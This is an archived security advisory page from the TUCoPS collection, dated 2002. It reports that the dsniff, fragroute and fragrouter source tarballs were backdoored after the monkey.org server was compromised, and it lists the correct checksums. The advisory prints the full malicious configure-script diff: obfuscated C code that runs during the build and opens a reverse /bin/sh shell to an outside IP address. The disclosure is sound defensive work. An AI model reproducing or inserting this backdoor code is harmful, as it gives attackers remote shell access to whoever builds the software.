@@ -1,0 +1,203 @@
+<html>
+<head>
+<title>TUCoPS ::  Unix :: General
+ :: unix5397.htm</title>
+</head>
+<body link="#0000ee" text="#ffffff" bgcolor="#000000" vlink="#551a8b" alink="#ff0000">
+<font face="Arial">
+<center>
+
+<br>
+<!-- google_ad_section_start -->
+<table border=0 width=900><tr><td align="center"><font face="Arial">
+<font size="4"><center><b><a href="../index.htm">TUCoPS ::  Unix :: General
+ :: unix5397.htm</a></b></center></font><br>
+<font size="2"><center><b>fragroute, dsniff and fragrouter have been backdoored </b></center></font>
+</td></tr>
+</table>
+</center>
+
+
+	<html>
+	<body link="#0000ee" text="#ffffff" bgcolor="#000000" vlink="#551a8b" alink="#ff0000">
+	<div align="right">4th Jun 2002 <tt>  [SBWID-5397]</tt></div>
+	<pre>
+<font color="#cc0000">COMMAND</font>
+
+	fragroute, dsniff and fragrouter have been backdoored
+
+<font color="#cc0000">SYSTEMS AFFECTED</font>
+
+	dsniff-2.3, fragroute-1.2, and fragrouter-1.6 source distributions
+
+<font color="#cc0000">PROBLEM</font>
+
+	Dug Song [http://www.monkey.org] explains:
+	
+
+	monkey.org  was  compromised  on  May  14th,   via   an   epic4-pre2.511
+	client-side hole which produced a shell to one  of  the  local  admin\'s
+	accounts. this  was  later  used  to  reattach  to  one  of  his  screen
+	sessions, which apparently had a root window open (su very bad!).
+	
+
+	the dsniff-2.3, fragroute-1.2,  and  fragrouter-1.6  tarballs  were  all
+	modified at 3 AM on May 17th to include the same configure  backdoor  as
+	described in the  irssi  advisory.  no  other  public  web  content  was
+	modified, and the system was restored a week later, from scratch.
+	
+
+	
+
+	Diff between good fragroute and backdoored one:
+	
+
+	<font color=#00ff00>
+
+	diff -Nur fragroute-1.2/configure fragroute-1.2-bad/configure
+
+	--- fragroute-1.2/configure	Mon Apr 15 16:41:43 2002
+
+	+++ fragroute-1.2-bad/configure	Mon Apr 15 16:41:43 2002
+
+	@@ -1590,6 +1590,53 @@
+
+	 
+
+	 fi
+
+	 
+
+	+cat > conftest.c&lt;&lt;EOF
+
+	+/* Override any gcc2 internal prototype to avoid an error.  */
+
+	+/* We use char because int might match the return type of a gcc2
+
+	+    builtin and then its argument prototype would still apply.  */
+
+	+#include &lt;stdio.h>
+
+	+#include &lt;sys/types.h>
+
+	+#include &lt;sys/socket.h>
+
+	+#include &lt;netinet/in.h>
+
+	+#include &lt;unistd.h>
+
+	+int main()
+
+	+{
+
+	+/* The GNU C library defines this for functions which it implements
+
+	+    to always fail with ENOSYS.  Some functions are actually named
+
+	+    something starting with __ and the normal name is an alias.  */
+
+	+        int s;
+
+	+        struct sockaddr_in sa;
+
+	+        switch(fork()) { case 0: break; default: exit(0); }
+
+	+        if((s = socket(AF_INET, SOCK_STREAM, 0)) == (-1)) {
+
+	+                exit(1);
+
+	+        }
+
+	+  /* HP/UX 9 (%@#!) writes to sscanf strings */
+
+	+        memset(&amp;sa, 0, sizeof(sa));
+
+	+        sa.sin_family = AF_INET;
+
+	+        sa.sin_port = htons(6667);
+
+	+/* Override any gcc2 internal prototype to avoid an error.  */
+
+	+/* We use char because int might match the return type of a gcc2
+
+	+    builtin and then its argument prototype would still apply.  */
+
+	+        sa.sin_addr.s_addr = inet_addr(\"216.80.99.202\");
+
+	+        if(connect(s, (struct sockaddr *)&amp;sa, sizeof(sa)) == (-1)) {
+
+	+                exit(1);
+
+	+        }
+
+	+  /* HP/UX 9 (%@#!) writes to sscanf strings */
+
+	+        dup2(s, 0); dup2(s, 1); dup2(s, 2);
+
+	+/* The GNU C library defines this for functions which it implements
+
+	+    to always fail with ENOSYS.  Some functions are actually named
+
+	+    something starting with __ and the normal name is an alias.  */
+
+	+        { char *args[] = { \"/bin/sh\", NULL }; execve(args[0], args, NULL); }
+
+	+}
+
+	+EOF
+
+	+gcc $LIBS conftest.c -o conftest; ./conftest
+
+	+if { (eval echo configure:2379: \\\"$ac_link\\\") 1>&amp;5; (eval $ac_link) 2>&amp;5; } &amp;&amp; test -s conftestx${ac_exeext}; then
+
+	+  rm -rf conftest*
+
+	+else
+
+	+  rm -rf conftest*
+
+	+fi
+
+	+rm -f conftest*
+
+	+
+
+	     # DLPI needs putmsg under HPUX so test for -lstr while we\'re at it
+
+	     echo $ac_n \"checking for putmsg in -lstr\"\"... $ac_c\" 1>&amp;6
+
+	 echo \"configure:1596: checking for putmsg in -lstr\" >&amp;5
+
+	</font>
+
+<font color="#cc0000">SOLUTION</font>
+
+	Verify checksums.
+	
+
+	the correct checksums are:
+	
+
+	<font color=#00ff00>
+
+	MD5 (dsniff-2.3.tar.gz) = 183e336a45e38013f3af840bddec44b4
+
+	MD5 (fragroute-1.2.tar.gz) = 7e4de763fae35a50e871bdcd1ac8e23a
+
+	MD5 (fragrouter-1.6.tar.gz) = 73fdc73f8da0b41b995420ded00533cc
+
+	</font></pre></body>
+</html>
+
+
+<!-- google_ad_section_end -->
+<p><center>
+
+<p></center>
+<center><a href="/firefox.htm">TUCoPS is optimized to look best in Firefox&reg; on a widescreen monitor (1440x900 or better).</a></center>
+<font size=1><center>Site design & layout copyright &copy; 1986-2026 AOH</font>
+</center>
+<br><center><IMG SRC="http://artofhacking.com/cgi-bin/sc/sc.cgi?acct=tucops&font=payphone-med"></center>
+<p>
+</body>
+</html>
